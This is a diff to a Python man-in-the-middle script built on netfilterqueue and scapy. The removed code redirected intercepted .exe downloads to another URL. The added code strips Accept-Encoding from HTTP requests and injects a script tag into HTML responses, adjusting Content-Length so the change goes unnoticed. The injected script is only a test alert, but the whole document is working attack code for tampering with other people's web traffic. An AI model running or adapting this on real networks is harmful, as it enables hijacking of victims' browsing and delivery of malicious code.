@@ -11,6 +11,7 @@
 
 import netfilterqueue
 import scapy.all as scapy
+import re
 
 ackList = []
 
@@ -21,23 +22,27 @@ def setLoad(packet, load):
 	del packet[scapy.TCP].chksum
 	return packet
 
-
 def processPacket(packet):
 	scapyPacket = scapy.IP(packet.get_payload())
 	if scapyPacket.haslayer(scapy.Raw):
+		load = scapyPacket[scapy.Raw].load
 		if scapyPacket[scapy.TCP].dport == 80:
-			if ".exe" in scapyPacket[scapy.Raw].load:
-				print("[+] EXE Request")
-				ackList.append(scapyPacket[scapy.TCP].ack)
+			print("[+] HTTP Request")
+			load = re.sub("Accept-Encoding:.*?\r\n", "", str(load))
 		elif scapyPacket[scapy.TCP].sport == 80:
-			if scapyPacket[scapy.TCP].seq in ackList:
-				ackList.remove(scapyPacket[scapy.TCP].seq)
-				print("[+] Replacing File")
-				modifiedPacket = setLoad(scapyPacket, "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp\n\n")
-				packet.set_payload(str(modifiedPacket))
+			print("[+] HTTP Responce")
+			injectionCode = "<script>alert('Testing');</script>"
+			load = load.replace("</body>", injectionCode + "</body>")
+			contentLengthSearch = re.search("(?:content-length:\s)(\d*)", load)
+			if contentLengthSearch and "text/html" in load:
+				contentLength = contentLengthSearch.group(1)
+				newContentLength = int(contentLength) + len(injectionCode)
+				load = load.replace(contentLength, str(newContentLength))
 
+		if load != scapyPacket[scapy.Raw].load:
+			newPacket = setLoad(scapyPacket, load)
+			packet.set_payload(bytes(newPacket))
 	packet.accept()
-
 
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, processPacket)
